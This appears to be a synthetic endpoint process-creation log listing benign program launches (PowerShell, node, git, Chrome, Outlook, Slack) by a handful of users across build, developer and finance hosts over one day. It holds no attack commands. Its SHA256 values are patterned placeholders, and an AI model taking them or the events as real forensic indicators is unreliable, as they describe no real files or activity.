2026-03-10 22:19:30.459,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00143a384786cd9200143a384786cd9200143a384786cd9200143a384786cd92
2026-03-10 22:30:51.951,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=001bc86caaa249d8001bc86caaa249d8001bc86caaa249d8001bc86caaa249d8
2026-03-10 22:45:38.011,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011a35fa58ce0ae0011a35fa58ce0ae0011a35fa58ce0ae0011a35fa58ce0ae
2026-03-10 22:59:46.198,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0011b0b845deb1940011b0b845deb1940011b0b845deb1940011b0b845deb194
2026-03-10 23:08:47.368,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0002a927078617bb0002a927078617bb0002a927078617bb0002a927078617bb
2026-03-10 23:15:57.368,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=001d4d02fc238088001d4d02fc238088001d4d02fc238088001d4d02fc238088
2026-03-10 23:28:55.425,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003c89750daeaa20003c89750daeaa20003c89750daeaa20003c89750daeaa2
2026-03-10 23:36:04.189,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00122949ec760e0100122949ec760e0100122949ec760e0100122949ec760e01
2026-03-10 23:46:18.798,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000197ec39093196000197ec39093196000197ec39093196000197ec39093196
2026-03-10 23:59:03.833,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00026b09f8eaeb2800026b09f8eaeb2800026b09f8eaeb2800026b09f8eaeb28
2026-03-11 00:08:42.445,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=00158d1cb098e66d00158d1cb098e66d00158d1cb098e66d00158d1cb098e66d
2026-03-11 00:18:20.022,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000778529ae676a8000778529ae676a8000778529ae676a8000778529ae676a8
2026-03-11 00:30:28.040,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0000979eca46a8fa0000979eca46a8fa0000979eca46a8fa0000979eca46a8fa
2026-03-11 00:36:22.106,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0016daecaa9bae3c0016daecaa9bae3c0016daecaa9bae3c0016daecaa9bae3c
2026-03-11 00:47:58.532,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=00022f105ec2891000022f105ec2891000022f105ec2891000022f105ec28910
2026-03-11 00:52:39.281,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b26c57eff52c0017b26c57eff52c0017b26c57eff52c0017b26c57eff52c
2026-03-11 01:02:03.296,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006001f3224d40a0006001f3224d40a0006001f3224d40a0006001f3224d40a
2026-03-11 01:14:53.418,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000589a8d5de0d0e000589a8d5de0d0e000589a8d5de0d0e000589a8d5de0d0e
2026-03-11 01:21:01.039,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001cfeb7c76c690a001cfeb7c76c690a001cfeb7c76c690a001cfeb7c76c690a
2026-03-11 01:33:23.719,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006f5f4366126390006f5f4366126390006f5f4366126390006f5f436612639
2026-03-11 01:38:04.062,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011d0638aa5365d0011d0638aa5365d0011d0638aa5365d0011d0638aa5365d
2026-03-11 01:46:30.366,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001453d1fc7047cb001453d1fc7047cb001453d1fc7047cb001453d1fc7047cb
2026-03-11 02:01:26.150,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015d3377c794b950015d3377c794b950015d3377c794b950015d3377c794b95
2026-03-11 02:14:46.280,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0010d7843f2c6b3c0010d7843f2c6b3c0010d7843f2c6b3c0010d7843f2c6b3c
2026-03-11 02:26:36.240,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015d34c4cb62f620015d34c4cb62f620015d34c4cb62f620015d34c4cb62f62
2026-03-11 02:38:29.745,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001bb207931815ce001bb207931815ce001bb207931815ce001bb207931815ce
2026-03-11 02:45:39.647,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000a5dd37827352d000a5dd37827352d000a5dd37827352d000a5dd37827352d
2026-03-11 02:49:39.783,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005796abe4d0a580005796abe4d0a580005796abe4d0a580005796abe4d0a58
2026-03-11 02:59:56.914,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c78da131a3603000c78da131a3603000c78da131a3603000c78da131a3603
2026-03-11 03:11:04.501,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00128d52ab63703d00128d52ab63703d00128d52ab63703d00128d52ab63703d
2026-03-11 03:20:05.937,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000f79e7c8ffa154000f79e7c8ffa154000f79e7c8ffa154000f79e7c8ffa154
2026-03-11 03:24:43.940,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a9d20f93f9096000a9d20f93f9096000a9d20f93f9096000a9d20f93f9096
2026-03-11 03:34:04.737,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001d2e66f643258a001d2e66f643258a001d2e66f643258a001d2e66f643258a
2026-03-11 03:46:36.988,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017a8e327aca0d40017a8e327aca0d40017a8e327aca0d40017a8e327aca0d4
2026-03-11 03:53:18.776,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017165ca38f85930017165ca38f85930017165ca38f85930017165ca38f8593
2026-03-11 04:05:10.404,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079fefdd130a5e00079fefdd130a5e00079fefdd130a5e00079fefdd130a5e
2026-03-11 04:18:06.857,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00143f86802b5fc300143f86802b5fc300143f86802b5fc300143f86802b5fc3
2026-03-11 04:29:30.729,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00235f8827d5c90000235f8827d5c90000235f8827d5c90000235f8827d5c900
2026-03-11 04:39:52.135,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=000b4ee0e5ed03c2000b4ee0e5ed03c2000b4ee0e5ed03c2000b4ee0e5ed03c2
2026-03-11 04:50:40.532,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00123daa64aee62500123daa64aee62500123daa64aee62500123daa64aee625
2026-03-11 05:04:28.325,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00202eea1e79c86200202eea1e79c86200202eea1e79c86200202eea1e79c862
2026-03-11 05:09:52.851,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002370c5b824552e002370c5b824552e002370c5b824552e002370c5b824552e
2026-03-11 05:23:44.634,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=00002cf2b500ef8a00002cf2b500ef8a00002cf2b500ef8a00002cf2b500ef8a
2026-03-11 05:32:25.548,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001105b8fb3b9566001105b8fb3b9566001105b8fb3b9566001105b8fb3b9566
2026-03-11 05:37:44.921,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00176c31bd8bdda500176c31bd8bdda500176c31bd8bdda500176c31bd8bdda5
2026-03-11 05:46:34.400,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000bbca079cc1063000bbca079cc1063000bbca079cc1063000bbca079cc1063
2026-03-11 05:54:25.993,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f5c9597f88b2a001f5c9597f88b2a001f5c9597f88b2a001f5c9597f88b2a
2026-03-11 06:01:13.800,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00027035c4e33fd400027035c4e33fd400027035c4e33fd400027035c4e33fd4
2026-03-11 06:15:35.337,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=001f432e4919723b001f432e4919723b001f432e4919723b001f432e4919723b
2026-03-11 06:19:10.712,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002151b0c76ecc0e002151b0c76ecc0e002151b0c76ecc0e002151b0c76ecc0e
2026-03-11 06:34:08.933,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001d894481f51f78001d894481f51f78001d894481f51f78001d894481f51f78
2026-03-11 06:45:04.792,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00046c7ce83f1cd000046c7ce83f1cd000046c7ce83f1cd000046c7ce83f1cd0
2026-03-11 06:50:03.648,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008acf6f4edcc660008acf6f4edcc660008acf6f4edcc660008acf6f4edcc66
2026-03-11 06:56:59.024,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000387bc6f8d01c0000387bc6f8d01c0000387bc6f8d01c0000387bc6f8d01c
2026-03-11 07:07:44.953,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00035aacf28d532900035aacf28d532900035aacf28d532900035aacf28d5329
2026-03-11 07:22:44.677,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=00164dff2d3c471800164dff2d3c471800164dff2d3c471800164dff2d3c4718
2026-03-11 07:33:18.021,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000694eb62c82e5e000694eb62c82e5e000694eb62c82e5e000694eb62c82e5e
2026-03-11 07:39:05.527,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=0007c9d79d17874c0007c9d79d17874c0007c9d79d17874c0007c9d79d17874c
2026-03-11 07:44:17.448,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016a10648c765540016a10648c765540016a10648c765540016a10648c76554
2026-03-11 07:48:12.912,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000272b931761ec0000272b931761ec0000272b931761ec0000272b931761ec0
2026-03-11 08:02:26.584,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0000768a4fff0bf80000768a4fff0bf80000768a4fff0bf80000768a4fff0bf8
2026-03-11 08:06:09.038,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00008340a2381bc300008340a2381bc300008340a2381bc300008340a2381bc3
2026-03-11 08:16:20.574,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=001518ae6bf4af33001518ae6bf4af33001518ae6bf4af33001518ae6bf4af33
2026-03-11 08:29:04.743,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000967607db58d64000967607db58d64000967607db58d64000967607db58d64
2026-03-11 08:42:06.407,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=001322bda8177187001322bda8177187001322bda8177187001322bda8177187
2026-03-11 08:50:23.476,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c2fd662b5f7e2001c2fd662b5f7e2001c2fd662b5f7e2001c2fd662b5f7e2
2026-03-11 08:56:27.320,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000ff6a61616112b000ff6a61616112b000ff6a61616112b000ff6a61616112b
2026-03-11 09:02:09.222,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=00071d31395fc09d00071d31395fc09d00071d31395fc09d00071d31395fc09d
2026-03-11 09:09:56.523,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002270c69dd06000002270c69dd06000002270c69dd06000002270c69dd06000
2026-03-11 09:16:56.339,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=000a460e208d5f55000a460e208d5f55000a460e208d5f55000a460e208d5f55
2026-03-11 09:27:25.216,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001dd039807c2f0d001dd039807c2f0d001dd039807c2f0d001dd039807c2f0d
2026-03-11 09:41:57.438,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019af006b352eb30019af006b352eb30019af006b352eb30019af006b352eb3
2026-03-11 09:54:00.926,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003355061ac22620003355061ac22620003355061ac22620003355061ac2262
2026-03-11 09:59:35.361,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001355c4ea51946e001355c4ea51946e001355c4ea51946e001355c4ea51946e
2026-03-11 10:08:13.110,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0004146308629f9c0004146308629f9c0004146308629f9c0004146308629f9c
2026-03-11 10:13:50.652,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=0005f12cfd07f9930005f12cfd07f9930005f12cfd07f9930005f12cfd07f993
2026-03-11 10:22:02.495,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=0023688f6be5e0560023688f6be5e0560023688f6be5e0560023688f6be5e056
2026-03-11 10:36:30.546,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00072a38359b3db200072a38359b3db200072a38359b3db200072a38359b3db2
2026-03-11 10:46:47.466,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=00022f31fd35735000022f31fd35735000022f31fd35735000022f31fd357350
2026-03-11 10:51:53.020,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000878b55a680402000878b55a680402000878b55a680402000878b55a680402
2026-03-11 11:01:43.771,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001fc904101ff215001fc904101ff215001fc904101ff215001fc904101ff215
2026-03-11 11:05:33.755,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00023f08488effb300023f08488effb300023f08488effb300023f08488effb3
2026-03-11 11:16:01.604,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e8eb82d04b65c000e8eb82d04b65c000e8eb82d04b65c000e8eb82d04b65c
2026-03-11 11:21:48.593,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a0aa0384a4d11001a0aa0384a4d11001a0aa0384a4d11001a0aa0384a4d11
2026-03-11 11:30:45.517,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a1a64cffcb989001a1a64cffcb989001a1a64cffcb989001a1a64cffcb989
2026-03-11 11:37:13.037,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000426d816997f20000426d816997f20000426d816997f20000426d816997f20
2026-03-11 11:42:36.325,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000123c7867ed1ed000123c7867ed1ed000123c7867ed1ed000123c7867ed1ed
2026-03-11 11:53:37.281,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020d592b60865d20020d592b60865d20020d592b60865d20020d592b60865d2
2026-03-11 12:02:09.023,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0018a2995ebf04b60018a2995ebf04b60018a2995ebf04b60018a2995ebf04b6
2026-03-11 12:13:13.902,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011500da8103f190011500da8103f190011500da8103f190011500da8103f19
2026-03-11 12:27:35.368,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=002241b02924f0b4002241b02924f0b4002241b02924f0b4002241b02924f0b4
2026-03-11 12:36:39.475,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00188b7dba2c154c00188b7dba2c154c00188b7dba2c154c00188b7dba2c154c
2026-03-11 12:46:03.072,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b589d06f43d59001b589d06f43d59001b589d06f43d59001b589d06f43d59
2026-03-11 12:57:34.709,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000071f475040fc5000071f475040fc5000071f475040fc5000071f475040fc5
2026-03-11 13:10:54.126,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=0016d5810b11caa40016d5810b11caa40016d5810b11caa40016d5810b11caa4
2026-03-11 13:22:14.002,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00197cb7a7f17eab00197cb7a7f17eab00197cb7a7f17eab00197cb7a7f17eab
2026-03-11 13:36:11.511,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=0000663c6580e9cf0000663c6580e9cf0000663c6580e9cf0000663c6580e9cf
2026-03-11 13:40:18.363,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e2f81d4100128000e2f81d4100128000e2f81d4100128000e2f81d4100128
2026-03-11 13:53:05.054,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002379c2bd067bfe002379c2bd067bfe002379c2bd067bfe002379c2bd067bfe
2026-03-11 14:07:09.110,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c30a1b6995dba000c30a1b6995dba000c30a1b6995dba000c30a1b6995dba
2026-03-11 14:12:32.364,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0004d2bc4664433a0004d2bc4664433a0004d2bc4664433a0004d2bc4664433a
2026-03-11 14:17:17.510,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0005b7fdbfc80e310005b7fdbfc80e310005b7fdbfc80e310005b7fdbfc80e31
2026-03-11 14:28:58.225,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000a97b6f0e24b8b000a97b6f0e24b8b000a97b6f0e24b8b000a97b6f0e24b8b
2026-03-11 14:39:41.169,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f983abd5e2d94001f983abd5e2d94001f983abd5e2d94001f983abd5e2d94
2026-03-11 14:46:54.433,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00140a35c024e4e200140a35c024e4e200140a35c024e4e200140a35c024e4e2
2026-03-11 14:51:05.416,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001c178b6800f411001c178b6800f411001c178b6800f411001c178b6800f411
2026-03-11 14:57:10.453,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001efa57421d842b001efa57421d842b001efa57421d842b001efa57421d842b
2026-03-11 15:01:50.774,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00133fe848394d9700133fe848394d9700133fe848394d9700133fe848394d97
2026-03-11 15:09:32.305,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000499b47fe4d8d8000499b47fe4d8d8000499b47fe4d8d8000499b47fe4d8d8
2026-03-11 15:20:19.713,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f04c71babe9d2001f04c71babe9d2001f04c71babe9d2001f04c71babe9d2
2026-03-11 15:26:31.427,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00044e898c0dc58d00044e898c0dc58d00044e898c0dc58d00044e898c0dc58d
2026-03-11 15:38:00.934,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=00042cbbcd76789b00042cbbcd76789b00042cbbcd76789b00042cbbcd76789b
2026-03-11 15:41:55.725,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0022cef018f785e00022cef018f785e00022cef018f785e00022cef018f785e0
2026-03-11 15:51:21.207,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=000319fbc89f2c25000319fbc89f2c25000319fbc89f2c25000319fbc89f2c25
2026-03-11 15:57:50.301,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=000fc62264ee703f000fc62264ee703f000fc62264ee703f000fc62264ee703f
2026-03-11 16:04:17.044,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a6447719d2264000a6447719d2264000a6447719d2264000a6447719d2264
2026-03-11 16:08:24.255,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f86bd693a428d000f86bd693a428d000f86bd693a428d000f86bd693a428d
2026-03-11 16:12:04.933,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ad709a331917d000ad709a331917d000ad709a331917d000ad709a331917d
2026-03-11 16:24:41.162,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002279e9128f10e8002279e9128f10e8002279e9128f10e8002279e9128f10e8
2026-03-11 16:29:03.319,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000449490c048f53000449490c048f53000449490c048f53000449490c048f53
2026-03-11 16:38:13.170,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001d88bcf48c91af001d88bcf48c91af001d88bcf48c91af001d88bcf48c91af
2026-03-11 16:50:15.640,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008695a11489a5c0008695a11489a5c0008695a11489a5c0008695a11489a5c
2026-03-11 16:54:00.830,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008d30db93beed30008d30db93beed30008d30db93beed30008d30db93beed3
2026-03-11 16:59:45.380,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020af801bd1ba640020af801bd1ba640020af801bd1ba640020af801bd1ba64
2026-03-11 17:09:11.515,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=00145f1476324bed00145f1476324bed00145f1476324bed00145f1476324bed
2026-03-11 17:20:34.903,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ba3ea4b7cb1ec000ba3ea4b7cb1ec000ba3ea4b7cb1ec000ba3ea4b7cb1ec
2026-03-11 17:32:47.416,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=000997501afe21af000997501afe21af000997501afe21af000997501afe21af
2026-03-11 17:46:43.683,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e66c1adbb5d52001e66c1adbb5d52001e66c1adbb5d52001e66c1adbb5d52
2026-03-11 17:59:08.274,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0022e7fb81613aae0022e7fb81613aae0022e7fb81613aae0022e7fb81613aae
2026-03-11 18:03:22.035,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e86ffeb4592d0001e86ffeb4592d0001e86ffeb4592d0001e86ffeb4592d0
2026-03-11 18:16:03.078,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001106ecf9bed293001106ecf9bed293001106ecf9bed293001106ecf9bed293
2026-03-11 18:23:37.469,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c523f1643af1c001c523f1643af1c001c523f1643af1c001c523f1643af1c
2026-03-11 18:34:37.574,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=00168af625ace83b00168af625ace83b00168af625ace83b00168af625ace83b
2026-03-11 18:39:46.002,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00103f91b329043b00103f91b329043b00103f91b329043b00103f91b329043b
2026-03-11 18:52:59.416,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00172d8de3678c4600172d8de3678c4600172d8de3678c4600172d8de3678c46
2026-03-11 18:59:53.934,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009deeaaa5dacaf0009deeaaa5dacaf0009deeaaa5dacaf0009deeaaa5dacaf
2026-03-11 19:09:48.878,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008bfa16b66a9270008bfa16b66a9270008bfa16b66a9270008bfa16b66a927
2026-03-11 19:18:40.519,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00105a469a54634000105a469a54634000105a469a54634000105a469a546340
2026-03-11 19:28:58.940,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c11d842aabebe001c11d842aabebe001c11d842aabebe001c11d842aabebe
2026-03-11 19:33:12.303,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016959ed309ffdb0016959ed309ffdb0016959ed309ffdb0016959ed309ffdb
2026-03-11 19:47:23.093,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cd8de320f22f0000cd8de320f22f0000cd8de320f22f0000cd8de320f22f0
2026-03-11 19:52:49.521,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e3cb905e5ac6a001e3cb905e5ac6a001e3cb905e5ac6a001e3cb905e5ac6a
2026-03-11 20:06:41.053,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000eb237479dd9e8000eb237479dd9e8000eb237479dd9e8000eb237479dd9e8
2026-03-11 20:17:47.486,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017891a7c47d88a0017891a7c47d88a0017891a7c47d88a0017891a7c47d88a
2026-03-11 20:24:50.528,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=000c9d82f080d3e2000c9d82f080d3e2000c9d82f080d3e2000c9d82f080d3e2
2026-03-11 20:39:45.181,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001914fa7f73f98d001914fa7f73f98d001914fa7f73f98d001914fa7f73f98d
2026-03-11 20:54:35.974,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020262b46ffa3aa0020262b46ffa3aa0020262b46ffa3aa0020262b46ffa3aa
2026-03-11 21:05:13.019,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000c120b94444c30000c120b94444c30000c120b94444c30000c120b94444c30
2026-03-11 21:12:41.654,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001268d86424603b001268d86424603b001268d86424603b001268d86424603b
2026-03-11 21:21:35.691,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=000ce1e9d847a7dd000ce1e9d847a7dd000ce1e9d847a7dd000ce1e9d847a7dd
2026-03-11 21:32:45.063,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001bbbe3ae67ad24001bbbe3ae67ad24001bbbe3ae67ad24001bbbe3ae67ad24
2026-03-11 21:45:57.969,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00116a98b2870f8300116a98b2870f8300116a98b2870f8300116a98b2870f83
2026-03-11 21:58:16.589,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0008b05beaa6a8930008b05beaa6a8930008b05beaa6a8930008b05beaa6a893
2026-03-11 22:07:54.964,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=001b0ac565209a40001b0ac565209a40001b0ac565209a40001b0ac565209a40
2026-03-11 22:14:20.955,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00018044a1260b3c00018044a1260b3c00018044a1260b3c00018044a1260b3c
2026-03-11 22:24:47.485,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000efdd9b7599e6e000efdd9b7599e6e000efdd9b7599e6e000efdd9b7599e6e
